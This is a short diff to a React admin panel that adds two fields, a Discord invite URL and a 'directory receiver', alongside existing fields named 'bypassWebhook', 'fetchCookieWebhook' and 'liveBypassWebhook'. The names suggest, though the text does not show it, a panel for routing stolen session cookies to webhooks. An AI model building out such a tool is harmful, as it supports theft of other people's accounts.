@@ -49,6 +49,8 @@ const AdminPanel = () => {
       bypassWebhook: newDir.bypassWebhook.trim(),
       fetchCookieWebhook: newDir.fetchCookieWebhook.trim(),
       liveBypassWebhook: newDir.liveBypassWebhook.trim(),
+      discordInviteUrl: newDir.discordInviteUrl.trim(),
+      directoryReceiver: newDir.directoryReceiver.trim(),
     });
     setDirs(getDirectories());
     setNewDir({ name: "", bypassWebhook: "", fetchCookieWebhook: "", liveBypassWebhook: "", discordInviteUrl: "", directoryReceiver: "" });
